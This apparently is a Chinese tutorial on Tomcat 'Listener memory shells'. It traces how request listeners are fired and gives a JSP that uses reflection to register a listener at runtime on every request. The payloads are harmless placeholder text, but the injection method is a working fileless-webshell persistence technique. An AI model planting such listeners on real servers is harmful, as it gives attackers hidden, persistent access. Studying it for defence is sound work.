# Listener内存马

创建Listener监听器
```java
package listener;

import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

public class demo_listener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("Listener Destroyed Method");
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        ServletRequest request = sre.getServletRequest();
        if (request.getParameter("cmd") != null){
            System.out.println("触发恶意代码");
        }
        System.out.println("Listener Init Method");
    }
}
```
在web.xml添加Listener
```xml
    <listener>
        <listener-class>listener.demo_listener</listener-class>
    </listener>
```
在监听器的requestInitialized函数下断点并触发断点,调用堆栈如下
```
requestInitialized:15, demo_listener (listener)
fireRequestInitEvent:5983, StandardContext (org.apache.catalina.core)
invoke:121, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:367, CoyoteAdapter (org.apache.catalina.connector)
service:639, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:750, Thread (java.lang)
```
可以看到，创建的监听器是又StandardContext类的fireRequestInitEvent方法触发的，查看fireRequestInitEvent方法
```java
@Override
public boolean fireRequestInitEvent(ServletRequest request) {
        // 获取所有listener
        Object instances[] = getApplicationEventListeners();
        // 调用监听器
        listener.requestInitialized(event);
    }
```
查看getApplicationEventListeners方法
```java
public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}
```
查看变量applicationEventListenersList的添加方法
```java
public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}
```
由于是公开的方法，所有只需要获取到StandardContext并调用该方法即可动态创建监听器。
```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.IOException" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/20
  Time: 14:07
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  ServletContext servletRequest = request.getSession().getServletContext();

  Field applicationContext = servletRequest.getClass().getDeclaredField("context");
  applicationContext.setAccessible(true);
  ApplicationContext applicationContext1 = (ApplicationContext) applicationContext.get(servletRequest);

  Field standContext = applicationContext1.getClass().getDeclaredField("context");
  standContext.setAccessible(true);
  StandardContext standardContext = (StandardContext) standContext.get(applicationContext1);

  ServletRequestListener servletRequestListener = new ServletRequestListener() {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
      HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
      try {
        Field request1 = req.getClass().getDeclaredField("request");

        request1.setAccessible(true);
        Request req1 = (Request)request1.get(req);
        req1.getResponse().setContentType("text/html;charset=UTF-8");
        req1.getResponse().setCharacterEncoding("UTF-8");

        PrintWriter out= req1.getResponse().getWriter();
        out.write("恶意代码测试");
        out.flush();
      } catch (NoSuchFieldException | IllegalAccessException | IOException e) {
        throw new RuntimeException(e);
      }

    }
  };
  standardContext.addApplicationEventListener(servletRequestListener);
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>

```